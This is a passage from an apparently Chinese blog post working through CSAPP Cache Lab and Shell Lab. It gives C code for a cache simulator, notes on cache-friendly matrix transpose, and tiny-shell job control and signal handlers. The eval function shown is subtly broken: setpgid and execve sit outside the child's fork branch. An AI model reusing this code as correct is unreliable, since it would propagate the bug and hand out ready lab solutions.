class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                cache-&gt;sets[setIndex].lines[i].LRU_count = <span class="number">0</span>;<span class="comment">// the hit one&#x27;s LRU is set to zero</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">//store is just like a load</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(Cache *cache, <span class="keyword">int</span> setIndex, <span class="keyword">int</span> tag, <span class="keyword">int</span> verbosity)</span> </span>&#123;<span class="comment">// a write is just like one load then one store</span></span><br><span class="line">    load(cache, setIndex, tag, verbosity);</span><br><span class="line">    store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replayTrace</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b, <span class="keyword">char</span>* buf, <span class="keyword">int</span> verbosity, Cache* cache)</span> </span>&#123;</span><br><span class="line">FILE *file;                        <span class="comment">// pointer to FILE object </span></span><br><span class="line">file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> type;                          <span class="comment">// L-load S-store M-modify </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> address;              <span class="comment">// 64-bit  memory address </span></span><br><span class="line"><span class="keyword">int</span> size;                           <span class="comment">//number of bytes accessed by operation </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tag_move_bits = b + s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">fscanf</span>(file, <span class="string">&quot; %c %lx,%d&quot;</span>, &amp;type, &amp;address, &amp;size) &gt; <span class="number">0</span>) &#123;<span class="comment">//for every line in the file</span></span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">//if it is an instruction, do nothing</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> tag = address &gt;&gt; tag_move_bits;<span class="comment">//get the tag</span></span><br><span class="line"><span class="keyword">int</span> setIndex = (address &gt;&gt; b) &amp; ((<span class="number">1</span> &lt;&lt; s) - <span class="number">1</span>);<span class="comment">//get the index</span></span><br><span class="line"><span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;<span class="comment">//print detailed info</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c %lx,%d &quot;</span>, type, address, size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;S&#x27;</span>) &#123;</span><br><span class="line">store(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type == <span class="string">&#x27;M&#x27;</span>) &#123;</span><br><span class="line">modify(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (type== <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">load(cache, setIndex, tag, verbosity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (verbosity == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h4><p>首先要明确，尽管矩阵的转置本身导致对于A矩阵（原始矩阵）的读和B矩阵（转置矩阵）的写不可能同时为连续的（即不可能同时存在连续读和连续写——对A矩阵行的连续读必然导致对B矩阵列的非连续写）。<br>但只要矩阵的大小小于缓存的总大小，那么在理想的情况下，在最初的强制不命中（即缓存为空导致的不命中）后，整个矩阵都会被加载进入缓存。在这之后的所有对于B矩阵的不连续写的引用都会命中。</p><p><strong>在该实验中</strong>，缓存采用的是直接映射高速缓存，s = 5，b = 5，E = 1。对于该缓存，总共存在32个组，每个组共32个字节，可以装入8个int型变量，是非常有限的缓存，主要需要解决以下两个问题：</p><ol><li>直接映射缓存所带来的冲突不命中。观察程序中矩阵存储的位置即可以发现，矩阵A和矩阵B的同一行实际上被映射到了同一个缓存组。当进行对角线的引用时，一定会发生缓存的冲突不命中。需要仔细地处理对角线上的元素。</li><li>所需优化的矩阵的总大小超出了缓存的总大小。必然导致程序的访存效率低下。</li></ol><p>代码见GitHub。</p><blockquote><p>参考：</p><p><a href="https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">https://blog.codedragon.tech/2017/09/25/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FCacheLab-PartB%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</a></p></blockquote><h3 id="Shell-Lab"><a href="#Shell-Lab" class="headerlink" title="Shell Lab"></a>Shell Lab</h3><p>任务：</p><ul><li><p>eval: 主要功能是解析cmdline，并且运行. [70 lines]</p></li><li><p>builtin cmd: 辨识和解析出bulidin命令: quit, fg, bg, and jobs. [25lines]</p></li><li><p>do bgfg: 实现bg和fg命令. [50 lines]</p></li><li><p>waitfg: 实现等待前台程序运行结束. [20 lines]</p></li><li><p>sigchld handler: 响应SIGCHLD. 80 lines]</p></li><li><p>sigint handler: 响应 SIGINT (ctrl-c) 信号. [15 lines]</p></li><li><p>sigtstp handler: 响应 SIGTSTP (ctrl-z) 信号. [15 lines]</p></li></ul><p>给出的函数：</p><ul><li><code>int parseline(const char *cmdline,char **argv)</code>：获取参数列表<code>char **argv</code>，返回是否为后台运行命令（<code>true</code>）。</li><li><code>void clearjob(struct job_t *job)</code>：清除<code>job</code>结构。</li><li><code>void initjobs(struct job_t *jobs)</code>：初始化<code>jobs</code>链表。</li><li><code>void maxjid(struct job_t *jobs)</code>：返回<code>jobs</code>链表中最大的<code>jid</code>号。</li><li><code>int addjob(struct job_t *jobs,pid_t pid,int state,char *cmdline)</code>：在<code>jobs</code>链表中添加<code>job</code></li><li><code>int deletejob(struct job_t *jobs,pid_t pid)</code>：在<code>jobs</code>链表中删除<code>pid</code>的<code>job</code>。</li><li><code>pid_t fgpid(struct job_t *jobs)</code>：返回当前前台运行<code>job</code>的<code>pid</code>号。</li><li><code>struct job_t *getjobpid(struct job_t *jobs,pid_t pid)</code>：返回<code>pid</code>号的<code>job</code>。</li><li><code>struct job_t *getjobjid(struct job_t *jobs,int jid)</code>：返回<code>jid</code>号的<code>job</code>。</li><li><code>int pid2jid(pid_t pid)</code>：将<code>pid</code>号转化为<code>jid</code>。</li><li><code>void listjobs(struct job_t *jobs)</code>：打印<code>jobs</code>。</li><li><code>void sigquit_handler(int sig)</code>：处理<code>SIGQUIT</code>信号。</li></ul><p>tsh应有的内置命令：</p><ul><li>quit: 退出当前shell</li><li>jobs: 列出所有后台运行的工作</li><li>bg <job>: 这个命令将会向<job>代表的工作发送SIGCONT信号并放在后台运行，<job>可以是一个PID也可以是一个JID（job ID）。</li><li>fg <job>: 这个命令会向<job>代表的工作发送SIGCONT信号并放在前台运行，<job>可以是一个PID也可以是一个JID</li></ul><blockquote><p>信号阻塞：</p><p>执行信号的处理动作成为信号递达（Delivery），信号从产生到递达之间的状态称为信号未决(Pending)。进程可以选择阻塞(Block)某个信号。<br>被阻塞的信号产生时将保持在未决状态，直到进程解除对此信号的阻塞，才执行递达的动作<br>注意：阻塞和忽略是不同的，只要信号被阻塞就不会递达，而忽略是在递达之后可选的一种处理动作<br>信号不会丢失，如果信号被阻塞，只会保持信号未决，但是信号不丢失</p></blockquote><p>对用户输入的参数进行解析并运行计算。书上已经给了 demo，我们优化一下即可。</p><p>有以下几点需要注意：</p><ul><li><code>SIGCHLD</code>信号：只要有一个子进程终止或者停止，内核就会发送一个 <code>SIGHLD</code>信号给父进程。</li><li>信号是不排队的。如果返回信号时，发现目的进程正在执行信号处理，那么该信号则会被阻塞，下一个则会被丢弃。因此，不能用信号来对其他进程中发生的事件计数。</li><li><strong>条件竞争</strong>：条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。本例情况是，如果在<strong>父进程</strong>能够再次运行之前，子进程终止，返回信号，而此时父进程还没执行 <code>addjob</code>，而信号处理回收子进程，执行 <code>deletejob</code>，由于还没添加到列表，所以这个函数什么都做不了，而这结束后父进程又会添加子进程，而产生一个永远不会被删除的job。</li></ul><p>代码参考tshref 源码：</p><p><a href="https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c">https://github.com/hestati63/CS230-SP/blob/67bf24d0a7f7b18e1472eaf369c6449dbf7d8d48/Assignment5/tsh.c</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS]; <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];   <span class="comment">/* Holds modified command line */</span></span><br><span class="line">    <span class="keyword">int</span> bg;              <span class="comment">/* Should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;           <span class="comment">/* Process id */</span></span><br><span class="line">    <span class="keyword">int</span> state = UNDEF;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, mask_one, prev_one;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv); <span class="comment">//解析命令</span></span><br><span class="line">    <span class="keyword">if</span>(bg == <span class="number">1</span>) &#123; <span class="comment">//判断是否在后台</span></span><br><span class="line">        state = BG;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        state = FG;  </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)  &#123; <span class="keyword">return</span>; &#125;   <span class="comment">/* Ignore empty lines */</span></span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all); <span class="comment">//防止竞争</span></span><br><span class="line">    sigemptyset(&amp;mask_one);</span><br><span class="line">    sigaddset(&amp;mask_one, SIGCHLD); <span class="comment">// ignore the SIGHLD</span></span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); <span class="comment">//block SIGHLD and save previous blocked set</span></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;  <span class="comment">//如果不是内置命令</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>); <span class="comment">//Restore previous blocked set, unblocking SIGHLD</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123; <span class="comment">// change the group id into pid</span></span><br><span class="line">            perror(<span class="string">&quot;SETPGID ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">    addjob(jobs, pid, state, cmdline);  <span class="comment">//add job</span></span><br><span class="line">    sigprocmask(SIG_UNBLOCK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(state == FG) &#123; <span class="comment">// if FG wait until finsihed else just print message</span></span><br><span class="line">        waitfg(pid);  <span class="comment">//等待前台程序执行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span>&#123; <span class="comment">// 如果是内置命令则直接执行</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;quit&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;jobs&quot;</span>)) &#123;</span><br><span class="line">        listjobs(jobs); <span class="comment">//print the jobs</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> parsed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="comment">// case no argument</span></span><br><span class="line">    <span class="keyword">if</span>(!argv[<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// parse argument，其中%开头的数字是JobID，纯数字的是PID</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobjid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%%%d: No such job\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">&quot;%d&quot;</span>,&amp;parsed))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, parsed)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d): No such process\n&quot;</span>, parsed);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;bg&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// make state BG</span></span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>)) &#123;</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="comment">// send SIGCONT</span></span><br><span class="line">        <span class="keyword">if</span>(kill(-job-&gt;pid, SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill error&quot;</span>);</span><br><span class="line">        <span class="comment">// wait until finish</span></span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do_bgfg: Internal error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123; <span class="comment">//等待子进程结束</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line">    <span class="keyword">if</span>(!job) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// while there is no FG process sleep</span></span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state == FG)</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// verbose message</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, jid;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// waitpid to find pid</span></span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if job deleted </span></span><br><span class="line">        <span class="keyword">if</span>((job = getjobpid(jobs, pid)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Lost track of (%d)\n&quot;</span>, pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        jid = job-&gt;jid;</span><br><span class="line">        <span class="comment">// stop signal</span></span><br><span class="line">        <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line">            <span class="keyword">if</span>(deletejob(jobs, pid))</span><br><span class="line">                <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n&quot;</span>, jid, pid, WEXITSTATUS(status));</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// exit by signal</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(deletejob(jobs, pid))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(verbose)</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;sigchld_handler: Job [%d] (%d) deleted\n&quot;</span>, jid, pid);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, jid, pid, WTERMSIG(status));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigchld_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span></span><br><span class="line"><span class="comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span></span><br><span class="line"><span class="comment"> *    to the foreground job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigint_handler: entering&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if fg exists send SIGINT，// 发送SIGINT给前台进程组里的所有进程，包括子进程。</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGINT) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (sigint) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigint_handler: Job (%d) killed\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span 